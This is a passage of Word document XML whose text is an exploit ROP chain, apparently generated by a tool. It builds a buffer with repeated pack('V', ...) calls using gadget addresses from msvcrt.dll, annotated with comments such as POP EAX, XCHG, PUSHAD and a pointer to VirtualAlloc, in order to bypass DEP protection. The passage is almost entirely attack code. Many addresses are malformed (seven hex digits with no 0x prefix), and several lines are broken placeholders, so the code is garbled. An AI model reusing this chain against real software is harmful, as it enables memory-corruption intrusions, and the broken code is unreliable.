            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>edx</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4ADFB5BA" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">$buffer .= pack('V',7c4eb80);  </w:t>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
              <w:t># ADD EAX);75C13B66 # ADD EAX);5D40C033 # RETN [msvcrt.dll]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="034B7458" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">$buffer .= pack('V',7c58fbc);  </w:t>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
              <w:t># XCHG EAX);EDX # RETN [msvcrt.dll]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00BB15C3" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>$buffer .= pack('V',--</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>INFO:gadgets_to_set_ecx</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>:---]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="243E7964" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">$buffer .= pack('V',7c4e0da);  </w:t>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
              <w:t># POP EAX # RETN [msvcrt.dll]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0BC3A780" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">$buffer .= pack('V',cfe04a7);  </w:t>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
              <w:t xml:space="preserve"># put delta into </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>eax</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (-&gt; put 0x00000040 into </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>ecx</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6BFD8658" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">$buffer .= pack('V',7c4eb80);  </w:t>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
              <w:t># ADD EAX);75C13B66 # ADD EAX);5D40C033 # RETN [msvcrt.dll]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7817BFEF" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">$buffer .= pack('V',7c14001);  </w:t>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
              <w:t># XCHG EAX);ECX # RETN [msvcrt.dll]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="422B33E0" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>$buffer .= pack('V',--</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>INFO:gadgets_to_set_edi</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>:---]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E72028D" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">$buffer .= pack('V',7c3048a);  </w:t>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
              <w:t># POP EDI # RETN [msvcrt.dll]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46D89D76" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">$buffer .= pack('V',7c47a42);  </w:t>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
              <w:t># RETN (ROP NOP) [msvcrt.dll]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F1D8138" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>$buffer .= pack('V',--</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>INFO:gadgets_to_set_esi</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>:---]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="29F33AE1" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">$buffer .= pack('V',7c46f30);  </w:t>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
              <w:t># POP ESI # RETN [msvcrt.dll]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73269530" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">$buffer .= pack('V',7c2aacc);  </w:t>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
              <w:t># JMP [EAX] [msvcrt.dll]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A364F45" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">$buffer .= pack('V',7c4e392);  </w:t>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
              <w:t># POP EAX # RETN [msvcrt.dll]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="008BD539" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">$buffer .= pack('V',7c1110c);  </w:t>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
              <w:t xml:space="preserve"># </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>ptr</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> to &amp;</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>VirtualAlloc</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>() [IAT msvcrt.dll]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F7FA64E" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>$buffer .= pack('V',--</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>INFO:pushad</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>:---]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F1BB376" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">$buffer .= pack('V',7c12df9);  </w:t>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
              <w:t># PUSHAD # RETN [msvcrt.dll]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54C092E4" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>$buffer .= pack('V',--</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>INFO:extras</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>:---]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7AD00EED" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">$buffer .= pack('V',7c35459);  </w:t>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
              <w:t xml:space="preserve"># </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>ptr</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
